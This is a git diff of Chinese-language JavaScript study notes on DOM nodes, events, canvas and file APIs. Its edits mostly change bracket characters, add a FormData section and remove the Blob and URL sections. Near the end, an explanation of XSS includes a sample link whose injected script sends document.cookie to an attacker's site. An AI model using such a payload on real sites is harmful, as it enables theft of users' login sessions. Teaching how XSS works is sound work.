@@ -63,8 +63,8 @@
     文档中所有的节点之间都存在着关系,同一类型节点间的关系可类比为家族关系,
     HTML 的子元素中有 body,body 的同胞元素有 head ... 等等
     虽然所有节点类型都继承自Node,但并非每种节点都有子节点.
-  nod.nodeType  节点类型「共12种」
-    PS:IE中不可使用如 Node.DOCUMENT_NODE 来进行判断「IE没有公开Node类型的构造函数」,
+  nod.nodeType  节点类型[共12种」
+    PS:IE中不可使用如 Node.DOCUMENT_NODE 来进行判断[IE没有公开Node类型的构造函数」,
       为跨浏览器兼容,最好将nodeType属性与数值 1-12 进行比较.
     Node.DOCUMENT_NODE     9,文档的根节点
     Node.ELEMENT_NODE      1,元素节点 
@@ -80,7 +80,7 @@
       Node.ENTITY_NODE;  // 6,在XML文档中表示一个实体
       Node.NOTATION_NODE; // 12,在XML文档中表示一个符号
     Example: :  document.nodeType == Node.DOCUMENT_NODE;  // true
-  nod.nodeName  节点名称「不同类型节点返回的形式不同」
+  nod.nodeName  节点名称[不同类型节点返回的形式不同」
     元素节点返回大写字母表示的元素名称; 属性节点返回属性名称; 文本节点返回 #text;
   nod.nodeValue;  值(具体定义取决于节点的类型)
     元素节点无value值,返回null;
@@ -159,7 +159,7 @@ Document文档根节点
     document.documentElement.textContent;  获取整个文档的文本以及CDATA数据
   document.body; 表示<body>元素,得到body标签及其包含的所有内容
     document.body === document.querySelector("body"); // true
-    「其他属性详见 DOM操作归纳总结->elem」
+    [其他属性详见 DOM操作归纳总结->elem」
   document.title; 取/设网页标题,类型为字符串
     Example: :
     PS-Self:通过中间量赋值方法更改网页标题失败
@@ -470,7 +470,7 @@ Document文档根节点
       Element Text Comment ProcessingInstruction
       CDATASection EntityReference
   HTMLElement 类型:HTMLDOM元素  [继承于 Element 类型] 
-    PS:可以直接通过 == 来比较「不同于ECMAScript中的对象」「SelfPoint」
+    PS:可以直接通过 == 来比较[不同于ECMAScript中的对象」[SelfPoint」
       所有HTML元素都有 HTMLElement 类型表示.
       Example: :
       div 为 HTMLDIVElement;
@@ -644,9 +644,9 @@ Document文档根节点
     }
     ul.appendChild(fragment);
   CDATASection 类型:只针对基于XML的文档,表示CDATA区域
-  框架「非节点类型之一」 
+  框架[非节点类型之一」 
     框架和内嵌框架分别用 HTMLFrameElement 和 HTMLIFrameElement 表示.
-    elem.contentDocument 表示执行框架的文档对象  「DOM2 IE8+」 
+    elem.contentDocument 表示执行框架的文档对象  [DOM2 IE8+」 
       此前无法直接通过元素获取到文档对象,只能使用frames集合.
     elem.contentWindow 返回框架的window对象 [所有都支持]
       然后.document 再获取到document对象
@@ -697,7 +697,7 @@ Document文档根节点
       Example: :
       获取所有类中包含 "user" 和 "name" 的元素(类名的先后顺序无所谓)
       var aoo =document.getElementsByClassName("user name");
-    elem.classList; 返回 DOMTokenList 集合类型的一个实例 「详见 归纳总结」
+    elem.classList; 返回 DOMTokenList 集合类型的一个实例 [详见 归纳总结」
     document.activeElement; 始终引用DOM中当前获得焦点的元素
       PS:
         默认情况下,文档刚加载完,document.activeElement 中保存的是document.body元素
@@ -845,7 +845,7 @@ DOM操作归纳总结
       elem.options[index].text;
     document.createElement("元素名a"); 创建元素对象,创建一个空元素a 
       (详见: 节点类型&详解 Document 创建)
-    nod.cloneNode(bool); 复制节点「详见: Node节点」 
+    nod.cloneNode(bool); 复制节点[详见: Node节点」 
   获取 elem 
     快捷方法获取
       document.documentElement  HTML元素
@@ -903,22 +903,22 @@ DOM操作归纳总结
         (详见:节点 Node节点)
       Nod.removeChild()  删除子元素 
         (详见: Node操作部分)
-      Nod.replaceChild() 替换子元素「详见Node操作部分」 
-      elem.remove()      删除元素「IE11不支持?」
+      Nod.replaceChild() 替换子元素[详见Node操作部分」 
+      elem.remove()      删除元素[IE11不支持?」
     元素尺寸、位置 
       PS:为方便描述,设定 元素的边界宽为content+padding+border+margin,
         元素布局宽为content+padding+border,元素内宽为content+padding,
-        元素宽为content的宽度「在box-sizing:content-box的默认条件下」
+        元素宽为content的宽度[在box-sizing:content-box的默认条件下」
         高度同理;
         当元素出现滚动条时,元素不会'膨胀',只会'挤压'其内部元素;
-      elem.offsetHeight 元素布局高「DiBs」 
+      elem.offsetHeight 元素布局高[DiBs」 
         包含scrollbar
         和元素内部的内容是否超出元素无关,只和width和border有关
-      elem.offsetWidth  元素布局宽「DiBs」
-      elem.offsetTop    元素相对其offsetParent「定位的父元素」的top
-      elem.offsetLeft   元素相对其offsetParent「定位的父元素」的left
+      elem.offsetWidth  元素布局宽[DiBs」
+      elem.offsetTop    元素相对其offsetParent[定位的父元素」的top
+      elem.offsetLeft   元素相对其offsetParent[定位的父元素」的left
       elem.clientWidth    只读,元素内宽 
-        不包括边框「IE包括」、滚动条部分
+        不包括边框[IE包括」、滚动条部分
           windows 中出现滚动条时为 content+padding-滚动条的宽度
           mac 中滚动条在未拖动时自动隐藏,因此不影响 
         无padding和滚动条时clientWidth等于元素设置的宽度
@@ -948,7 +948,7 @@ DOM操作归纳总结
       elem.scrollTop    读写,元素垂直滚动距离
       elem.scrollLeft   读写,元素水平滚动距离
       elem.scrollIntoView() 将节点滚动到可视窗口中 
-      elem.getBoundingClientRect() 返回一对象,用于获得元素相对视口的位置「DiBs」
+      elem.getBoundingClientRect() 返回一对象,用于获得元素相对视口的位置[DiBs」
         elem.getBoundingClientRect().width  元素宽
         elem.getBoundingClientRect().height 元素高
         elem.getBoundingClientRect().top    元素顶部到可视区顶部的距离
@@ -962,11 +962,11 @@ DOM操作归纳总结
       elem.attributes 元素所有属性的集合
         (详见 HTMLElement 类型)
       elem.style   一个元素样式的对象,行内样式 
-        PS:style.xx 的值需要事先定义在html标签里「CSS中也不行」,否则获取不到,
+        PS:style.xx 的值需要事先定义在html标签里[CSS中也不行」,否则获取不到,
           返回值为字符串,如 style.left 返回 '20px';
         elem.style.left   读写,相对于具有定位属性父元素的left 
         elem.style.width  读写,元素宽
-        elem.style.cursor 显示的指针「光标」的类型
+        elem.style.cursor 显示的指针[光标」的类型
       elem.classList 元素所有class的集合
         PS: firefox 和 Chrome 支持该属性
         elem.classList.length  获取类的个数
@@ -1111,7 +1111,7 @@ DOM操作归纳总结
         getStyle(document.getElementById('test'), 'height');
   其他相关 
     scrollbar  滚动轴 
-      PS:在Windows和Mac系统中存在差异,Mac中滚动轴默认隐藏,滚动时出现,不占宽度「为0」;
+      PS:在Windows和Mac系统中存在差异,Mac中滚动轴默认隐藏,滚动时出现,不占宽度[为0」;
       获取滚动轴宽度scrollbarWidth
         方法一  var scrollbarWidth = elem.offsetWidth - elem.clientWidth;
         方法二  
@@ -1152,7 +1152,7 @@ DOM操作归纳总结
   PS:响应某个事件的函数就叫做事件处理程序[或事件侦听器] 
     事件处理程序的名字以"on"开头加上事件名
     函数中 this 等于 事件的目标元素
-  HTML事件处理程序「也叫内联事件处理程序」 
+  HTML事件处理程序[也叫内联事件处理程序」 
     在内联模型中,事件处理函数是html标签的一个属性,用于处理指定事件.
     Example: :
     <input type="button" value="clickme" onclick="alert('点击')">
@@ -1220,7 +1220,7 @@ Event事件对象
     所有浏览器都支持event对象,但支持的方式不一定相同.
     event会被作为参数传到执行函数中.
     event对象与创建的事件有关,触发的事件类型不一样可用的属性/方法也不同
-    只有在事件处理程序执行期间,event对象才存在「一旦执行完则会被销毁」
+    只有在事件处理程序执行期间,event对象才存在[一旦执行完则会被销毁」
   Example: 验证隐藏的参数
     //普通空参函数
     function box(){console.log(arguments.length);}
@@ -1240,7 +1240,7 @@ Event事件对象
   ◆公有属性/方法
   e.target;      事件的目标
     目标元素在文档中是事件冒泡的前提(即删除目标元素也会阻止事件冒泡)
-  e.currentTarget;  表示绑定的元素「即在函数中的this」
+  e.currentTarget;  表示绑定的元素[即在函数中的this」
     若直接将事件绑定在目标元素上,则this currentTarget target 相同
   e.type;        返回事件类型
   e.preventDefault();  阻止事件的默认行为
@@ -1289,7 +1289,7 @@ Event事件对象
   e.x           相对于CSS定位的最内层包容元素的左上角
     IE最先引入,现在主流浏览器基本都支持;
     在Chrome中和clientX相同;在IE中当设置了定位则和offsetX相同,否则和clientX相同;
-  ◆修改键「鼠标、键盘事件」
+  ◆修改键[鼠标、键盘事件」
     在按下鼠标时键盘上某些键的状态也可以影响到所要采取的操作
     修改键如:Shift Ctrl Alt Meta(Windows中为Windows键,Mac中为Cmd键)
   e.shiftKey 布尔值,表示该键是否被按下
@@ -1313,7 +1313,7 @@ Event事件对象
   ◆DOM3级规定了一下几类事件
   'User-Interface'用户界面,UI事件 当用户与页面上的元素交互时触发 
     PS:不一定与用户操作有关; 除DOMActivate之外,其他事件在DOM2中都归为HTML事件
-    DOMActivate 表示元素已经被用户操作「通过鼠标或键盘」激活 「DOM3级中废弃」
+    DOMActivate 表示元素已经被用户操作[通过鼠标或键盘」激活 [DOM3级中废弃」
     load    加载完后触发 
       window.onload 页面完全加载后触发,包括所有图像、JS文件、CSS文件等外部资源 
       iframe.onload 框架加载完毕时触发 
@@ -1337,7 +1337,7 @@ Event事件对象
       无法加载图像时在<img>元素触发,
       无法加载嵌入内容在<object>元素上触发,
       有框架无法加载时在框架集上触发 [?]
-    select  当用户选择文本框「input或textarea,且disabled为false时」中的字符时触发 
+    select  当用户选择文本框[input或textarea,且disabled为false时」中的字符时触发 
       支持该事件的标签:<input type="text">, <textarea>
       e.target.selectionStart 选中字符的indx
       e.target.selectionEnd   选中字符的indx
@@ -1490,7 +1490,7 @@ Event事件对象
       loaded 对象加载数据完成
       interactive  可以操作对象了,但还没有完全加载
       complete 对象已经加载完毕
-  hashchange URL变化时在window上触发「IE8+」 
+  hashchange URL变化时在window上触发[IE8+」 
   // 设备相关事件
   [详参 JavaScript高级程序设计 395 页]
   ◆其他事件:
@@ -1570,7 +1570,7 @@ Event事件对象
        因为该变量及整个页面的状态,都保存在了内存中,当返回时,变量的状态得到了恢复;
        若刷新浏览器,则showCount的值会被重置为0,因为页面已经完全重新加载了。
      event.persisted  返回表示页面是否来自bfcache的布尔值
-    pagehide  在浏览器卸载页面的时候触发 「unload事件之前」
+    pagehide  在浏览器卸载页面的时候触发 [unload事件之前」
      PS:与pageshow一样,在document上面触发,但必须要绑定在Windows对象上;
        指定了unload事件处理程序的页面会被自动排除在bfcache之外,即使事件处理程序是空的。
        因为unload常用于撤销在load中所执行的操作,而跳过load后显示页面可能导致页面异常  
@@ -1722,7 +1722,7 @@ Event事件对象
       // e.target matches document from above
     }, false);
     document.dispatchEvent(event); 触发事件
-    自定义事件「DOM3」 
+    自定义事件[DOM3」 
     var evt = document.createEvent("CustomEvent");   创建事件 
     evt.initEvent('customEvent',true,true);          定义事件类型 
     evt.initCustomEvent(str,boo,boo,obj);            初始化事件 
@@ -1801,7 +1801,7 @@ Event事件对象
 事件归纳总结 
   事件枚举及分类
     ◆在window上触发的事件 
-    popstate   当活动历史记录条目更改时,在window上触发「HTML5 IE10+」
+    popstate   当活动历史记录条目更改时,在window上触发[HTML5 IE10+」
       PS:调用history.pushState()或history.replaceState()不会触发该事件,
         只有在做出浏览器动作时,才会触发该事件,如用户点击浏览器的回退按钮,
         或者在JS代码中调用 history.back();
@@ -1816,12 +1816,12 @@ Event事件对象
           // state1 就是 pushState 的第一个参数,详情常见BOM history
           console.log(state1)
         })
-    hashchange URL变化时在window上触发「IE8+」 
+    hashchange URL变化时在window上触发[IE8+」 
       PS:当#值发生变化时也会触发这个事件
       e.oldURL; 变化前的URL
       e.newURL; 变化后的URL
     ◆
-    scroll     滚动「带滚动条的」元素时在该元素上触发「网页滚动在window上触发」
+    scroll     滚动[带滚动条的」元素时在该元素上触发[网页滚动在window上触发」
       window.onscroll =function(){
         console.log('网页滚动');
       }
@@ -1903,7 +1903,7 @@ Special
 Event 事件 
   Touch 触摸事件
     PS:由于触摸会导致屏幕滚动,在事件函数内使用 e.preventDefault() 阻止掉默认事件(默认滚动)
-    ◆基本触摸事件「在规范中列出并获得跨移动设备广泛实现」
+    ◆基本触摸事件[在规范中列出并获得跨移动设备广泛实现」
     touchstart  当手指放在屏幕上触发;
     touchmove   当手指在屏幕上滑动时,连续地触发;
       Example:
@@ -1930,7 +1930,7 @@ Event 事件
           flagYear =true;
         })
     touchend    当手指从屏幕上离开时触发;
-    ◆额外的三个触摸事件「DiBs」
+    ◆额外的三个触摸事件[DiBs」
     touchenter   移动的手指进入一个DOM元素
     touchleave   移动手指离开一个DOM元素
     touchcancel  触摸被中断
@@ -2036,7 +2036,7 @@ Event 事件
     });
 WeiXin 微信  
   不支持的功能
-    模板字符串  ios中支持,android中不支持「20170124」
+    模板字符串  ios中支持,android中不支持[20170124」
     可使用 window.open() 来打开新窗口,但都在当前窗口中打开,不支持 window.opener 来传递信息
     不支持进行跳转到上一步url中带有参数 的url地址  [?]
       比如:一个查询列表页的url是: http://someweb?city=beijing
@@ -2437,14 +2437,14 @@ WeiXin 微信
     canvas标签只有width和height两个属性,默认为宽度300px和高度150px;
     若CSS的尺寸与初始画布的比例不一致,它会出现扭曲;
   限制
-    出于安全考虑,浏览器不允许处理跨域图像「利用特殊的手段可以突破该限制?」
+    出于安全考虑,浏览器不允许处理跨域图像[利用特殊的手段可以突破该限制?」
     可通过设置 Access-Control-Allow-Origin 来跨域
     解决处理跨域图像出现的安全警告的方法是使用CORS;
     为了阻止欺骗,浏览器会追踪 image data,
-    当把跟canvas域不同的图片放到canvas上,canvas就成为“tainted”「被污染的,脏的」,
+    当把跟canvas域不同的图片放到canvas上,canvas就成为“tainted”[被污染的,脏的」,
     浏览器就不让你操作该canvas 的任何像素,
-    对于阻止多种类型的XSS/CSRF攻击「两种典型的跨站攻击」是非常有用的;
-    没有服务器环境「比如本地的html网页,操作本地的一张图片」,
+    对于阻止多种类型的XSS/CSRF攻击[两种典型的跨站攻击」是非常有用的;
+    没有服务器环境[比如本地的html网页,操作本地的一张图片」,
     会报"Unable to get image data ... has been tainted by cross-origin data"错误 
     本地网页的域为'file://,如:file:///home/summer/Desktop/test.html',
     本地图片不是以'file://'开头的,如 'c:\tmp\test.png'
@@ -2458,7 +2458,7 @@ WeiXin 微信
   检测浏览器是否支持画布:检测是否存在getContext方法
     if(canvas.getContext) {  }else {  }
   var cvs = document.querySelector('canvas');  canvas对象
-    cvs.toDataURL(type,quality); 返回包含图片的 data URI「需将图片预先放入canvas」
+    cvs.toDataURL(type,quality); 返回包含图片的 data URI[需将图片预先放入canvas」
       PS:若画布的高度或宽度是0,那么会返回字符串“data:,”;
       type     可选,返回的图片类型,默认为 PNG
         图片的分辨率为96dpi;
@@ -3119,6 +3119,38 @@ WYSIWYG 富文本编辑 [详参 JavaScript高级程序设计 440 页]
     Example: :
     转换粗体文本
     frames["XX"].document.execCommand("bold",false,null);
+FormData 用于模拟表单[HTML5」
+  PS:为序列化表单及创建与表单格式相同的数据,用于通过xhr传输提供了便利 
+    不用明确的设置请求头,xhr对象能够识别传入的数据类型是FormData,并配置适当头信息 
+  var fd = new FormData([formElem]); 创建FormData对象
+    Example: 通过表单元素创建
+      var fd = new FormData(document.forms[0]);
+  fd.append(key,val [,name]); 向FormData对象中添加信息
+    PS:当信息添加完后就可直接使用 xhr.send(fd) 进行发送
+    key   表单的控件名,
+    val   实际的值
+    name  可选,通常是文件名 
+  Example:
+    模拟File控件,进行文件上传 
+    function uploadFiles(url, files) {
+      var formData = new FormData();
+      for(var i = 0; i< files.length; i++) {
+        formData.append(files[i].name, files[i]);
+      }
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', url, true);
+      xhr.onload = function(e) { };
+      xhr.send(formData);  // multipart/form-data
+    }
+    var inputFile = document.querySelector('input[type="file"]');
+    inputFile.addEventListener('change', function(e) {
+      uploadFiles('/server', this.files);
+    }, false);
+    
+    加入JS生成的文件 
+    var content = '<a id="a"><b id="b">hey!</b></a>';
+    var blob = new Blob([content], { type: "text/xml"});
+    formData.append("webmasterfile", blob);
 FileList 对象与 File 对象 [HTML5]
   PS:FileList对象表示用户选择的文件列表,
     HTML4中,file控件内只能选中一个文件,
@@ -3150,21 +3182,10 @@ FileList 对象与 File 对象 [HTML5]
   file.size;  文件的字节大小 
   file.lastModified      文件的上次修改时间,格式为时间戳。
   file.lastModeFiedDate  文件上一次被修改的时间,格式为Date对象实例 [仅Chrome支持]
-Blob 对象[HTML5] 
-  PS:代表原始二进制数据,File 对象继承了Blob对象 
-  获取Blob对象
-    <input type="file" id="file" multiple size="80" accept="image/*"/>
-    <input type="button" onclick="ShowFileType();" value="显示文件信息"/>
-    function ShowFileType() {
-      var file = document.getElementById("file").files[0];
-      console.log(file);
-    }
-  blob.size   Blob对象的字节长度
-  blob.type   Blob的MIME类型,若是未知类型,则返回一个空字符串 
-FileReader 对象  用于读取文件[把文件内容读入内存]
+FileReader 对象: 用于读取文件[把文件内容读入内存] 
   PS:FileReader采用的是一种异步的文件读取机制
-  var fr = new FileReader([arg]); 创建fr对象 
-    arg  File 对象或 Blob 对象
+  var fr = new FileReader([arg])  创建fr对象 
+    arg  File对象或Blob对象 
   ◆属性&方法 
   ★读取文件数据到'result'中
   fr.readAsBinaryString(Blob|File) 得到文件的二进制字符串 
@@ -3273,58 +3294,6 @@ FileReader 对象  用于读取文件[把文件内容读入内存]
     }
     将字符串转成8位无符号整型,然后存放到一个8位无符号整型数组里面,
     再把整个数组发送出去。
-URL 对象         用于对二进制数据生成URL 
-  PS:用于生成指向File对象或Blob对象的URL,
-    同样的二进制数据, 每调用一次URL.createObjectURL方法,就会得到一个不一样的URL,
-    这个URL的存在时间,等同于网页的存在时间,
-    一旦网页刷新或卸载,这个URL就失效。
-    除此之外,也可以手动调用 URL.revokeObjectURL 方法,使URL失效。
-  var objecturl =  window.URL.createObjectURL(blob);  创建url对象实例 
-    上面的代码会对二进制数据生成一个URL,
-    类似于 "blob:http%3A//test.com/666e6730-f45c-47c1-8012-ccc706f17191"
-    这个URL可以放置于任何通常可以放置URL的地方,比如img标签的src属性。
-  window.URL.revokeObjectURL(objectURL); 使URL失效
-  Example:
-    在网页插入图片
-    var img = document.createElement("img");
-    img.src = window.URL.createObjectURL(files[0]);
-    img.height = 60;
-    img.onload = function(e) {
-      window.URL.revokeObjectURL(this.src);
-    }
-    docment.body.appendChild(img);
-    var info = document.createElement("span");
-    info.innerHTML = files[i].name + ": " + files[i].size + " bytes";
-    docment.body.appendChild(info);
-    
-    本机视频预览
-    var video = document.getElementById('video');
-    var obj_url = window.URL.createObjectURL(blob);
-    video.src = obj_url;
-    video.play()
-    window.URL.revokeObjectURL(obj_url);  
-    
-    function html5Reader(file) {         
-      var fileObj = file.files[0],
-      img = document.getElementById("img");   
-      // URL.createObjectURL  safari不支持
-      img.src = URL.createObjectURL(fileObj);
-      img.onload =function() {
-        var data = getBase64Image(img);
-        console.log(data);  // 打印出base64编码
-      }
-    }
-    function getBase64Image(img) {
-      var canvas = document.createElement("canvas");
-      canvas.width = img.width;
-      canvas.height = img.height;
-      
-      var ctx = canvas.getContext("2d");
-      ctx.drawImage(img, 0, 0, img.width, img.height);
-      var ext = img.src.substring(img.src.lastIndexOf(".")+1).toLowerCase();
-      var dataURL = canvas.toDataURL("image/"+ext);
-      return dataURL;
-    }
 'Web Workers' 工作线程[HTML5]
   JavaScript是单线程,一次只能做一件事.
   HTML5 可使JS创建多个Web工作线程.
@@ -3438,7 +3407,7 @@ URL 对象         用于对二进制数据生成URL
     tr.insertCell(2).innerHTML ="数据2"
     tr.insertCell(3).innerHTML ="数据3"
     document.body.appendChild(table);
-  JavaScript&XML「详参 JavaScript高级程序设计 552 页」 
+  JavaScript&XML[详参 JavaScript高级程序设计 552 页」 
   XSS,Cross SiteScript 跨站脚本攻击 
     PS:Web程序中常见的漏洞,属于被动式且用于客户端的攻击方式;
       理论上,所有可输入的地方没有对输入数据进行处理的话,都会存在XSS漏洞;
@@ -3449,7 +3418,7 @@ URL 对象         用于对二进制数据生成URL
       Example:
         如一个获取他人Cookie的超链接,
         'http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>',
-        当点击这个链接的时候「假设点击者已经登录a.com」,浏览器就会直接打开b.com,
+        当点击这个链接的时候[假设点击者已经登录a.com」,浏览器就会直接打开b.com,
         并且把点击者在 a.com 中的 cookie信息发送到 b.com, b.com 就是攻击者搭建的网站,
         当网站接收到该信息时,就盗取了受害者在 a.com 的cookie信息,
         cookie信息中可能存有登录密码,攻击成功！
@@ -3479,7 +3448,7 @@ URL 对象         用于对二进制数据生成URL
           // ...     
         }) 
       })
-      x-aoo  标签类型「名字」需使用 - 连接
+      x-aoo  标签类型[名字」需使用 - 连接
       不能是以下这些:
       annotation-xml、color-profile、font-face、font-face-src、
       font-face-uri、font-face-format、font-face-name、missing-glyph
